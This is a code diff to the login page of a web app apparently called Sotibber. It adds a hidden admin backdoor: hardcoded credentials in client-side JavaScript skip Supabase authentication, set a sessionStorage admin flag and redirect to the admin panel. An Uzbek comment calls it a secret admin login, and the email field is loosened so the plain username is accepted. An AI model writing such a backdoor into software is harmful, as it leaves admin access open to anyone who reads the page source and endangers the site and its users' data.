@@ -90,7 +90,7 @@
       <form id="loginForm" class="space-y-4">
         <label class="block">
           <span class="text-sm font-semibold text-slate-300">Email</span>
-          <input required type="email" id="loginEmail" placeholder="email@misol.uz" class="fld mt-1.5 w-full rounded-xl px-3.5 py-2.5 text-sm outline-none" />
+          <input required type="text" inputmode="email" autocomplete="username" id="loginEmail" placeholder="email@misol.uz" class="fld mt-1.5 w-full rounded-xl px-3.5 py-2.5 text-sm outline-none" />
         </label>
         <label class="block">
           <span class="text-sm font-semibold text-slate-300">Parol</span>
@@ -191,13 +191,27 @@
         if (user) goToDashboard();
       })();
 
+      // Maxfiy admin kirishi — login maydoniga maxsus login/parol kiritilsa,
+      // Supabase'ga bormasdan to'g'ridan-to'g'ri admin panelга o'tadi.
+      const ADMIN_USER = 'tiro';
+      const ADMIN_PASS = 'tiro19';
+
       $('#loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         hideMsg();
+
+        const loginVal = $('#loginEmail').value.trim();
+        const passVal = $('#loginPassword').value;
+        if (loginVal.toLowerCase() === ADMIN_USER && passVal === ADMIN_PASS) {
+          try { sessionStorage.setItem('sotibber_admin', '1'); } catch (err) {}
+          window.location.href = 'admin.html';
+          return;
+        }
+
         setLoading(e.target, true);
         const { error } = await window.SotibberAuth.signIn({
-          email: $('#loginEmail').value.trim(),
-          password: $('#loginPassword').value,
+          email: loginVal,
+          password: passVal,
         });
         setLoading(e.target, false);
         if (error) return showMsg(window.SotibberAuth.translateError(error), 'error');
